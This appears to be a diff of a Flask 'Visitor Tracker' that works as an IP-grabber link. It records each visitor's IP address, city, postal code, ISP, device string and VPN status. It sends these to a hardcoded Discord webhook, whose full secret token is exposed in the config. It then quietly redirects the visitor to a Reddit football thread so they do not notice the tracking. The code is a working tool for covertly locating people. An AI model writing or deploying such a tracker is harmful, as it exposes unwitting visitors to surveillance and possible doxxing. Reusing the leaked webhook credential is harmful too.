@@ -6,15 +6,16 @@ import time
 
 app = Flask(__name__)
 
-# CONFIG
+# ===================== CONFIG =====================
 DISCORD_WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1430264733193207848/5fOooaQ3VYQePvd7m0ZR6hZsYPW0ML6pk9jZ5wMcin7JkyuHHVg_IQicnDqr18NWvsQh"
 REDDIT_URL = "https://www.reddit.com/r/football/comments/y8xqif/how_to_be_better_in_football_in_a_fast_time/"
 
 CLOUD_PROVIDERS = ["Amazon","AWS","Google Cloud","DigitalOcean","Hetzner","Microsoft","Azure","Linode","OVH"]
 BOT_KEYWORDS = ["bot","crawl","spider","wget","curl","python-requests"]
+
 logged_ips_today = set()
 
-# FUNCTIONS
+# ===================== FUNCTIONS =====================
 def get_real_ip():
     for header in ["X-Forwarded-For","CF-Connecting-IP","X-Real-IP"]:
         ip = request.headers.get(header)
@@ -61,7 +62,24 @@ def send_to_discord(info,retries=3,delay=2):
     vpn_text = "Yes 🚨" if info['vpn'] else "No ✅"
     fallback_text = " (Fallback API)" if info['fallback_used'] else ""
     embed_color = 16711680 if info['vpn'] else 7506394
-    payload = {"username":"🌍 Visitor Tracker","embeds":[{"title":f"🚶 New Visitor from {info['country']}{fallback_text}","color":embed_color,"fields":[{"name":"🖥️ IP Address","value":f"`{info['ip']}`","inline":False},{"name":"📍 Location","value":f"{info['city']}, {info['region']} ({info['country']})\\nPostal: {info['postal']}","inline":False},{"name":"🏢 ISP / Organization","value":info['org'],"inline":False},{"name":"📱 Device Info","value":f"`{info['user_agent']}`","inline":False},{"name":"🌍 Google Maps","value":f"[Open Map]({info['map_url']})","inline":False},{"name":"🛡️ VPN / Proxy Detected","value":vpn_text,"inline":False}],"footer":{"text":f"Logged at {info['date']} {info['time']} GMT"}}]}
+    payload = {
+        "username":"🌍 Visitor Tracker",
+        "embeds":[
+            {
+                "title":f"🚶 New Visitor from {info['country']}{fallback_text}",
+                "color":embed_color,
+                "fields":[
+                    {"name":"🖥️ IP Address","value":f"`{info['ip']}`","inline":False},
+                    {"name":"📍 Location","value":f"{info['city']}, {info['region']} ({info['country']})\nPostal: {info['postal']}","inline":False},
+                    {"name":"🏢 ISP / Organization","value":info['org'],"inline":False},
+                    {"name":"📱 Device Info","value":f"`{info['user_agent']}`","inline":False},
+                    {"name":"🌍 Google Maps","value":f"[Open Map]({info['map_url']})","inline":False},
+                    {"name":"🛡️ VPN / Proxy Detected","value":vpn_text,"inline":False}
+                ],
+                "footer":{"text":f"Logged at {info['date']} {info['time']} GMT"}
+            }
+        ]
+    }
     for attempt in range(1,retries+1):
         try:
             resp = requests.post(DISCORD_WEBHOOK_URL,json=payload,timeout=5)
@@ -69,6 +87,7 @@ def send_to_discord(info,retries=3,delay=2):
         except: pass
         if attempt<retries: time.sleep(delay)
 
+# ===================== ROUTES =====================
 @app.route('/')
 def index():
     ip = get_real_ip()
@@ -84,6 +103,7 @@ def index():
     send_to_discord(visitor_info)
     return redirect(REDDIT_URL)
 
+# ===================== DAILY RESET =====================
 def clear_logged_ips():
     global logged_ips_today
     logged_ips_today=set()
@@ -93,8 +113,3 @@ clear_logged_ips()
 
 if __name__=="__main__":
     app.run(host="0.0.0.0",port=10000,debug=False)
-"""
-
-with open("main.py","w",encoding="utf-8") as f:
-    f.write(script_content)
-print("main.py created successfully.")
